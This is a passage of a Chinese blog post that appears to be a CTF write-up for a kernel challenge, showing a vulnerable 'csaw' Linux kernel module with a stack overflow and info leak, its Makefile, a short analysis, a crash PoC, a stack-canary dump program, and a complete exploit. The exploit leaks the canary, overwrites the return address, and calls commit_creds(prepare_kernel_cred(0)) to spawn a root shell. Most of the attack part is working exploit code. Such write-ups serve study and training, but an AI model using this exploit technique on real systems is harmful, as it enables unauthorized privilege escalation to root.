of luck!n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, buf + off, MAX_LENGTH);</span><br><span class="line">    <span class="keyword">return</span> MAX_LENGTH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __init</span><br><span class="line">csaw_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: loading modulen"</span>);</span><br><span class="line">    csaw_proc = create_proc_entry(<span class="string">"csaw"</span>, <span class="number">0666</span>, <span class="literal">NULL</span>);</span><br><span class="line">    csaw_proc-&gt;read_proc = csaw_read;</span><br><span class="line">    csaw_proc-&gt;write_proc = csaw_write;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: created /proc/csaw entryn"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit</span><br><span class="line">csaw_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (csaw_proc) &#123;</span><br><span class="line">        remove_proc_entry(<span class="string">"csaw"</span>, csaw_proc);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: unloading modulen"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(csaw_init);</span><br><span class="line">module_exit(csaw_exit);</span><br></pre></td></tr></table></figure></p>
<p>Makefile如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := csaw.o  </span><br><span class="line">KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/</span><br><span class="line">PWD := $(shell pwd)  </span><br><span class="line">modules:  </span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules  </span><br><span class="line">moduels_install:  </span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </span><br><span class="line">clean:  </span><br><span class="line">        rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></p>
<h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 : 分析"></a>0x02 : 分析</h1><p>首先漏洞点很好找，就是一个简单粗暴的栈溢出：</p>
<pre><code>这里，从用户空间做拷贝的时候未作任何check，
导致过长的字符串可以覆盖到返回地值，
这种情形和我们第二篇文章中遇到的情况一样，
那么是不是就按照那个文章做利用就可以了呢？
并不是，从注释中看出，出题者是开启了kernel CANARY选项的，
也就是说，我们直接去覆盖的话，
会先覆盖CANARY，然后就会过不了check从而kernel panic。
是不是这就没法玩了呢？一般来说，对于CANARY这种情况，
我们采取的策略要么是leak，要么就是crack。继续分析代码，看到read部分：


拼接了栈上一个变量，然后拷贝到了用户空间，
而且拷贝的长度很长，这就是出题人故意留下的info leak，
好让我们可以leak CANARY的值。
那么现在，我们拥有一个info leak，拥有一个stack     bof，两者结合，就是第二篇文章中的利用方式了。只需要组合payload为：
junk+CANARY+ebp+payload_addr
我们就可以像之前一样去get root shell啦~
</code></pre><h1 id="0x03-Poc"><a href="#0x03-Poc" class="headerlink" title="0x03 : Poc"></a>0x03 : Poc</h1><p>poc的代码很简单，直接触发漏洞就可以，但是这种直接就kernel panic的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:n"</span>);</span><br><span class="line">    write(fd,poc,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面我们写一个dump，可以dump出CANARY的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="comment">// memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>还和之前一样，编译后，丢busybox文件系统，
然后qemu起系统，之后测试我们的dump程序是否工作正常
h可以看到，我们的dump程序可以正常dump出CANARY的值，
那么下面的工作就很简单了，直接可以利用这个leak，构造payload去拿root shell了。
</code></pre><h1 id="0x04-Exploit"><a href="#0x04-Exploit" class="headerlink" title="0x04 : Exploit"></a>0x04 : Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs; popl tf+4;"</span></span><br><span class="line">        <span class="string">"pushfl; popl tf+8;"</span></span><br><span class="line">        <span class="string">"pushl %esp; popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss; popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;launch_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067fc0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067e20</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">       <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="comment">//memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">84</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">76</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(poc+<span class="number">64</span>,canary,<span class="number">4</span>);<span class="comment">//set canary</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(poc+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]payload:%sn"</span>,poc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:n"</span>);</span><br><span class="line">    <span class="comment">//init tf struct;</span></span><br><span class="line">    prepare_tf();</span><br><span class="line">    write(fd,poc,<span class="number">76</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



</div></div>
    <aside id="sidebar" class="alignright">
  

  
<div class="widget tag">
  <h3 class="title">archives</h3>
  <ul class="entry">
    
      <li>
        <a href="/2018/10/21/线下赛/">线下赛</a>
      </li>
    
      <li>
        <a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a>
      </li>
    
      <li>
        <a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a>
      </li>
    
      <li>
        <a href="/2018/10/21/堆溢出/">堆溢出</a>
      </li>
    
      <li>
        <a href="/2018/10/21/分布式/">分布式搭建</a>
      </li>
    
      <li>
        <a href="/2018/10/21/内核编译/">内核编译</a>
      </li>
    
      <li>
        <a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a>
      </li>
    
      <li>
        <a href="/2018/10/21/两道内核/">两道内核</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windows机制/">windows机制</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windbg学习总结/">windbg学习总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/web/">随意码的web</a>
      </li>
    
      <li>
        <a href="/2018/10/21/sulb/">slub</a>
      </li>
    
      <li>
        <a href="/2018/10/21/rtd/">return to dl-resolve</a>
      </li>
    
      <li>
        <a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/patch/">patch</a>
      </li>
    
      <li>
        <a href="/2018/10/21/offbyone/">off-by-one</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hor/">House-Of-Rabbit</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hfo/">house-of-orange</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hexo/">搭建博客</a>
      </li>
    
      <li>
        <a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/doublefree/">double free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/brop/">brop</a>
      </li>
    
      <li>
        <a href="/2018/10/21/bpf/">bpf</a>
      </li>
    
      <li>
        <a href="/2018/10/21/afl/">afl</a>
      </li>
    
  </ul>
</div>


  

  
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2018 another
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>